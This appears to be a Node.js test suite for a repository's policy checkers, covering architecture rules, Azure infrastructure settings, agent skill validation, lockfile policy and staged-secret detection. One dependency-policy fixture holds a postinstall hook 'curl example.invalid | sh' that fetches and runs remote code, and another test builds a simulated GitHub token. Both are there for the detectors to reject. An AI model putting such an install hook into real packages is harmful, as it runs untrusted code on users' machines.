import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import {
  architectureFindings,
  bundledMcpFindings,
  importsFrom,
  sourceArchitectureFindings,
} from '../check-architecture.mjs';
import { dependencyPairingFindings, inspectDependencyFiles } from '../check-lockfile-policy.mjs';
import {
  isSensitiveRepositoryPath,
  repositoryHygieneFindings,
  stagedSecretFindings,
} from '../check-repository-hygiene.mjs';
import { agentWorkflowContractFindings, loadAgentWorkflowDocuments } from '../check-agent-workflow-contracts.mjs';
import { validateAgentSkills } from '../validate-agent-skills.mjs';

test('repository architecture dependency directions are valid', () => {
  assert.deepEqual(architectureFindings(), []);
});

test('architecture import parser recognizes static and dynamic imports', () => {
  assert.deepEqual(importsFrom("import value from './one.js'; await import('../two.js');"), ['./one.js', '../two.js']);
});

test('application architecture rejects transport and Azure runtime SDK imports', () => {
  const root = '/tmp/architecture-fixture';
  const file = `${root}/application/operation.ts`;
  const findings = sourceArchitectureFindings(
    file,
    "import type { HttpRequest } from '@azure/functions'; import { tool } from '../mcp/tool.js';",
    root,
  );
  assert.ok(findings.some((finding) => finding.includes('runtime SDK @azure/functions')));
  assert.ok(findings.some((finding) => finding.includes('application must not import mcp')));
});

test('authorization architecture rejects provider and transport dependencies', () => {
  const root = '/tmp/architecture-fixture';
  const file = `${root}/application/authorization/policy.ts`;
  const findings = sourceArchitectureFindings(file, "import { client } from '../../shared/bring/client.js';", root);
  assert.ok(findings.some((finding) => finding.includes('authorization policy must remain')));
});

test('MCP stays bundled behind one server and one Function route', () => {
  assert.deepEqual(bundledMcpFindings(), []);
});

test('Azure Functions loads the fail-closed composition root before registering functions', () => {
  const apiPackage = JSON.parse(readFileSync(new URL('../../apps/api/package.json', import.meta.url), 'utf8'));
  const compositionRoot = readFileSync(new URL('../../apps/api/src/index.ts', import.meta.url), 'utf8');
  const infrastructure = readFileSync(new URL('../../infra/main.bicep', import.meta.url), 'utf8');
  const functionAppSettingsModule = readFileSync(
    new URL('../../infra/modules/function-app-settings.bicep', import.meta.url),
    'utf8',
  );
  assert.equal(apiPackage.main, 'dist/index.js');
  assert.ok(
    compositionRoot.indexOf('assertRuntimeSafety();') < compositionRoot.indexOf("import('./functions/health.js')"),
  );
  assert.match(infrastructure, /module functionAppSettings '\.\/modules\/function-app-settings\.bicep' = \{/);
  assert.doesNotMatch(infrastructure, /resource functionAppSettings 'Microsoft\.Web\/sites\/config/);
  assert.match(infrastructure, /list\('\$\{functionApp\.id\}\/config\/appsettings'/);
  assert.match(infrastructure, /appSettings: union\(preservedFunctionReleaseSettings, \{/);
  assert.match(functionAppSettingsModule, /@secure\(\)\s+@description[\s\S]*?param appSettings object/);
  assert.match(functionAppSettingsModule, /resource appSettingsResource 'Microsoft\.Web\/sites\/config@[^']+' = \{/);
  assert.match(functionAppSettingsModule, /properties: appSettings/);
  for (const setting of [
    ['AUTH_ENABLED', 'authEnabled'],
    ['AUTH_DEBUG', 'authDebug'],
    ['BRING_ENABLED', 'bringEnabled'],
    ['BRING_ADD_ENABLED', 'validatedBringAddEnabled'],
    ['BRING_DESTRUCTIVE_ENABLED', 'validatedBringDestructiveEnabled'],
    ['BRING_SESSION_CACHE_ENABLED', 'bringSessionCacheEnabled'],
    ['REPAIRABLE_ERRORS_LLM_ENABLED', 'repairableErrorsLlmEnabled'],
  ]) {
    assert.match(infrastructure, new RegExp(`${setting[0]}: toLower\\(string\\(${setting[1]}\\)\\)`));
  }
  assert.doesNotMatch(
    infrastructure,
    /(?:AUTH_ENABLED|AUTH_DEBUG|BRING_ENABLED|BRING_ADD_ENABLED|BRING_DESTRUCTIVE_ENABLED|BRING_SESSION_CACHE_ENABLED|REPAIRABLE_ERRORS_LLM_ENABLED): string\(/,
  );
  for (const setting of [
    'WEBSITE_RUN_FROM_PACKAGE',
    'DEPLOYED_COMMIT_SHA',
    'DEPLOYED_SOURCE_REF',
    'RELEASE_FUNCTION_SHA256',
    'RELEASE_FRONTEND_SHA256',
    'RELEASE_SBOM_SHA256',
  ]) {
    assert.match(infrastructure, new RegExp(`contains\\(existingFunctionAppSettings, '${setting}'\\)`));
  }
  assert.doesNotMatch(infrastructure, /siteConfig:\s*\{[\s\S]*?appSettings:\s*\[/);
});

test('repository agent skills have valid frontmatter and unique names', () => {
  assert.deepEqual(validateAgentSkills(), []);
});

test('repository agent workflows retain their durable delivery contracts', () => {
  const documents = loadAgentWorkflowDocuments();
  assert.deepEqual(agentWorkflowContractFindings(documents), []);
  assert.ok(
    agentWorkflowContractFindings({ ...documents, delivery: '' }).some((finding) =>
      finding.includes('full branch diff'),
    ),
  );
});

test('agent skill validation rejects official metadata violations and broken local links', () => {
  const root = mkdtempSync(join(tmpdir(), 'agent-skill-validation-'));
  const skill = join(root, 'unsafe-skill');
  mkdirSync(skill, { recursive: true });
  writeFileSync(
    join(skill, 'SKILL.md'),
    `---\nname: Unsafe_Skill\ndescription: Use this skill to move <unsafe> changes.\nextra: true\n---\n\n# Unsafe\n\nSee [missing](references/missing.md).\n`,
  );
  try {
    const findings = validateAgentSkills(root);
    assert.ok(findings.some((finding) => finding.includes('name must be unsafe-skill')));
    assert.ok(findings.some((finding) => finding.includes('lowercase letters, digits, and hyphens')));
    assert.ok(findings.some((finding) => finding.includes('angle brackets')));
    assert.ok(findings.some((finding) => finding.includes('unsupported frontmatter key extra')));
    assert.ok(findings.some((finding) => finding.includes('local link does not exist')));
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('dependency policy rejects lifecycle scripts and non-registry dependencies', () => {
  const findings = inspectDependencyFiles(
    {
      scripts: { postinstall: 'curl example.invalid | sh' },
      dependencies: { unsafe: 'git+https://example.invalid/repo.git' },
    },
    { lockfileVersion: 2, packages: {} },
  );
  assert.ok(findings.some((finding) => finding.includes('postinstall')));
  assert.ok(findings.some((finding) => finding.includes('non-registry')));
  assert.ok(findings.some((finding) => finding.includes('lockfileVersion 3')));
});

test('dependency policy requires package and lock files to change together in both npm projects', () => {
  assert.deepEqual(dependencyPairingFindings(['package.json', 'package-lock.json']), []);
  assert.deepEqual(dependencyPairingFindings(['apps/api/package.json']), [
    'apps/api/package.json and apps/api/package-lock.json must change together',
  ]);
  assert.deepEqual(
    dependencyPairingFindings(['package-lock.json', 'apps/api/package.json', 'apps/api/package-lock.json']),
    ['package.json and package-lock.json must change together'],
  );
});

test('repository hygiene rejects tracked local state and recognizes required ignore probes', () => {
  assert.equal(isSensitiveRepositoryPath('.codex/environments/environment.toml'), true);
  assert.equal(isSensitiveRepositoryPath('apps/api/local.settings.json'), true);
  assert.equal(isSensitiveRepositoryPath('.env.example'), false);
  const ignoredPaths = new Set([
    '.codex/environments/environment.toml',
    '.azure/accessTokens.json',
    '.env',
    '.env.local',
    'local.settings.json',
    'apps/api/local.settings.json',
  ]);
  assert.deepEqual(repositoryHygieneFindings({ trackedFiles: ['src/index.ts'], ignoredPaths }), []);
  assert.ok(
    repositoryHygieneFindings({ trackedFiles: ['.codex/environments/environment.toml'], ignoredPaths }).some(
      (finding) => finding.includes('sensitive local path is tracked'),
    ),
  );
});

test('repository hygiene detects strong staged secret signatures without echoing their values', () => {
  const simulatedToken = `gh${'p_'}abcdefghijklmnopqrstuvwxyz1234567890`;
  const findings = stagedSecretFindings(`+token = "${simulatedToken}"\n`);
  assert.deepEqual(findings, ['staged changes contain a github-token signature']);
  assert.equal(findings.join('\n').includes('ghp_'), false);
});
